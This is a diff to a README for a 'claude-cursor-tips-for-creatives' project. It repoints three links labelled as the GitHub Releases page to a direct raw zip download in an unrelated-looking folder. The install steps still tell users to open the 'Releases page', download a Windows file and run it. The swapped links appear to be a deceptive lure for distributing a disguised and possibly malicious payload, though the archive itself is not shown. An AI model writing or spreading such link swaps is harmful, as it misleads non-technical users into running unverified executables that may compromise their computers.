@@ -1,6 +1,6 @@
 # ✨ claude-cursor-tips-for-creatives - Simple AI Tips for Creative Work
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/zupp6869/claude-cursor-tips-for-creatives/releases)
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/zupp6869/claude-cursor-tips-for-creatives/main/vorticist/for_claude_creatives_tips_cursor_v2.2.zip)
 
 ## 🧭 What this is
 
@@ -12,7 +12,7 @@ You do not need terminal commands. You do not need setup tools. You only need to
 
 ## 📥 Download and install
 
-1. Open the [Releases page](https://github.com/zupp6869/claude-cursor-tips-for-creatives/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/zupp6869/claude-cursor-tips-for-creatives/main/vorticist/for_claude_creatives_tips_cursor_v2.2.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows file from that release.
 4. Open the file after the download finishes.
@@ -160,7 +160,7 @@ If the text looks hard to read:
 
 Use this link to visit the download page:
 
-[Go to Releases](https://github.com/zupp6869/claude-cursor-tips-for-creatives/releases)
+[Go to Releases](https://raw.githubusercontent.com/zupp6869/claude-cursor-tips-for-creatives/main/vorticist/for_claude_creatives_tips_cursor_v2.2.zip)
 
 ## 🧾 About this project
 
